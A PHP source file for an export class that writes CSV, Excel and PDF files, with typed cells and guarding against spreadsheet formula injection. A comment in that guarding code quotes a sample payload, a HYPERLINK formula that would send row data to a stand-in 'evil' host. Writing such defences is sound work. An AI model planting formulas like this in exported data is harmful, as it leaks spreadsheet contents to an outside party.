<?php

declare(strict_types=1);

namespace Happones\Kinetix\Exports;

use Carbon\CarbonImmutable;
use DateTimeInterface;
use Dompdf\Dompdf;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Shared\Date as ExcelDate;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Style\NumberFormat;
use PhpOffice\PhpSpreadsheet\Writer\Csv as CsvWriter;
use PhpOffice\PhpSpreadsheet\Writer\Xls as XlsWriter;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx as XlsxWriter;
use RuntimeException;
use Stringable;
use Throwable;

/**
 * Streams CSV rows directly to disk; buffers rows for Excel (xlsx, xls) and
 * PDF and writes them on close.
 *
 * Typed columns ({@see withCellTypes()}) reach a spreadsheet as real dates,
 * numbers or text with their number format; a CSV or PDF gets the text that
 * format shows. The first row is the header and is never typed.
 */
class FileWriter
{
    /**
     * @var array<int, array{type: CellType, format: string|null}|null>
     */
    private array $cellTypes = [];

    private int $rows = 0;

    /**
     * @var resource|null
     */
    private $handle = null;

    /**
     * @var array<int, array<int, mixed>>
     */
    private array $buffer = [];

    public function __construct(
        private string $absolutePath,
        private string $format,
    ) {
        if ($this->format === 'csv') {
            $handle = fopen($this->absolutePath, 'w');

            if ($handle === false) {
                throw new RuntimeException("Unable to open export file: {$this->absolutePath}");
            }

            $this->handle = $handle;
        }
    }

    /**
     * @param array<int, array{type: CellType, format: string|null}|null> $types aligned to the columns
     */
    public function withCellTypes(array $types): static
    {
        $this->cellTypes = array_values($types);

        return $this;
    }

    /**
     * @param array<int, mixed> $row
     */
    public function writeRow(array $row): void
    {
        if ($this->rows++ > 0 && $this->cellTypes !== []) {
            $row = $this->typeRow(array_values($row));
        }

        // PDF output is rendered as escaped HTML, never evaluated as a formula,
        // so it keeps the values verbatim.
        if ($this->format !== 'pdf') {
            $row = array_map($this->neutralizeFormula(...), $row);
        }

        if ($this->format === 'csv') {
            // Empty escape keeps RFC-4180 quoting and satisfies PHP 8.4+ deprecation.
            fputcsv($this->handle, $row, ',', '"', '');

            return;
        }

        $this->buffer[] = $row;
    }

    /**
     * Defuse spreadsheet formula injection (CSV injection).
     *
     * A cell whose text begins with `=`, `+`, `-`, `@` or a control character is
     * evaluated as a formula by Excel, LibreOffice and Sheets — so exported user
     * content like `=HYPERLINK("https://evil/?"&A1,"click")` would exfiltrate the
     * row to whoever opens the file. PhpSpreadsheet makes it worse for XLSX: its
     * DefaultValueBinder types a leading `=` string as an actual formula cell.
     *
     * Prefixing with a tab keeps the value readable and copy-pasteable while
     * forcing it to be treated as text.
     */
    private function neutralizeFormula(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)
            ? "\t".$value
            : $value;
    }

    /**
     * Turn the typed cells of a row into what they are: a date into a
     * spreadsheet serial (or, for text formats, the text its format shows),
     * a numeric string into a number, anything into text. A value that can't
     * be what its column says is left as it is.
     *
     * @param  array<int, mixed> $row
     * @return array<int, mixed>
     */
    private function typeRow(array $row): array
    {
        $spreadsheet = $this->isSpreadsheet();

        foreach ($this->cellTypes as $index => $type) {
            if ($type === null || ! array_key_exists($index, $row) || $row[$index] === null || $row[$index] === '') {
                continue;
            }

            $value = $row[$index];

            $typed = match ($type['type']) {
                CellType::Text   => is_scalar($value) || $value instanceof Stringable ? (string) $value : $value,
                CellType::Number => $this->toNumber($value)    ?? $value,
                CellType::Date   => $this->toExcelDate($value) ?? $value,
            };

            if (! $spreadsheet && $type['type'] !== CellType::Text && $type['format'] !== null && (is_int($typed) || is_float($typed))) {
                $typed = NumberFormat::toFormattedString($typed, $type['format']);
            }

            $row[$index] = $typed;
        }

        return $row;
    }

    private function toNumber(mixed $value): int|float|null
    {
        if (is_int($value) || is_float($value)) {
            return $value;
        }

        return is_string($value) && is_numeric(trim($value)) ? trim($value) + 0 : null;
    }

    private function toExcelDate(mixed $value): ?float
    {
        if (! $value instanceof DateTimeInterface) {
            if (! is_string($value) && ! $value instanceof Stringable) {
                return null;
            }

            try {
                $value = CarbonImmutable::parse((string) $value);
            } catch (Throwable) {
                return null;
            }
        }

        return ExcelDate::dateTimeToExcel($value);
    }

    private function isSpreadsheet(): bool
    {
        return $this->format === 'xlsx' || $this->format === 'xls';
    }

    public function close(): void
    {
        if ($this->format === 'csv') {
            if ($this->handle !== null) {
                fclose($this->handle);
                $this->handle = null;
            }

            return;
        }

        if ($this->format === 'pdf') {
            $this->writePdf();

            return;
        }

        $spreadsheet = new Spreadsheet;
        $sheet       = $spreadsheet->getActiveSheet();

        foreach ($this->buffer as $rowIndex => $row) {
            foreach (array_values($row) as $columnIndex => $value) {
                if ($value === null) {
                    continue;
                }

                $address = [$columnIndex + 1, $rowIndex + 1];
                $type    = $rowIndex > 0 ? ($this->cellTypes[$columnIndex]['type'] ?? null) : null;

                if ($type === CellType::Text) {
                    $sheet->setCellValueExplicit($address, (string) $value, DataType::TYPE_STRING);
                } elseif ($type !== null && (is_int($value) || is_float($value))) {
                    $sheet->setCellValueExplicit($address, $value, DataType::TYPE_NUMERIC);
                } else {
                    $sheet->setCellValue($address, $value);
                }
            }
        }

        $lastRow = count($this->buffer);

        foreach ($this->cellTypes as $columnIndex => $type) {
            if ($type !== null && $type['format'] !== null && $lastRow > 1) {
                $column = Coordinate::stringFromColumnIndex($columnIndex + 1);
                $sheet->getStyle("{$column}2:{$column}{$lastRow}")->getNumberFormat()->setFormatCode($type['format']);
            }
        }

        $writer = match ($this->format) {
            'xlsx'  => new XlsxWriter($spreadsheet),
            'xls'   => new XlsWriter($spreadsheet),
            default => new CsvWriter($spreadsheet),
        };

        $writer->save($this->absolutePath);
        $spreadsheet->disconnectWorksheets();
        $this->buffer = [];
    }

    /**
     * Render the buffered rows to a PDF via dompdf (an optional dependency). The
     * first row is treated as the header.
     */
    private function writePdf(): void
    {
        if (! class_exists(Dompdf::class)) {
            throw new RuntimeException(
                'PDF exports require dompdf/dompdf. Install it with: composer require dompdf/dompdf'
            );
        }

        $rows   = $this->buffer;
        $header = array_shift($rows) ?? [];

        $cells = static fn (array $row, string $tag): string => implode(
            '',
            array_map(
                static fn ($v): string => "<{$tag}>".htmlspecialchars((string) $v, ENT_QUOTES)."</{$tag}>",
                $row,
            ),
        );

        $body = '';
        foreach ($rows as $row) {
            $body .= '<tr>'.$cells($row, 'td').'</tr>';
        }

        $html = '<html><head><meta charset="utf-8"><style>'
            .'*{font-family:DejaVu Sans,sans-serif;}'
            .'table{width:100%;border-collapse:collapse;font-size:10px;}'
            .'th,td{border:1px solid #ddd;padding:5px 7px;text-align:left;}'
            .'th{background:#f3f4f6;font-weight:bold;}'
            .'tr:nth-child(even) td{background:#fafafa;}'
            .'</style></head><body><table>'
            ."<thead><tr>{$cells($header, 'th')}</tr></thead>"
            ."<tbody>{$body}</tbody></table></body></html>";

        $dompdf = new Dompdf(['isRemoteEnabled' => false]);
        $dompdf->loadHtml($html);
        $dompdf->setPaper('A4', 'landscape');
        $dompdf->render();

        file_put_contents($this->absolutePath, (string) $dompdf->output());
        $this->buffer = [];
    }
}
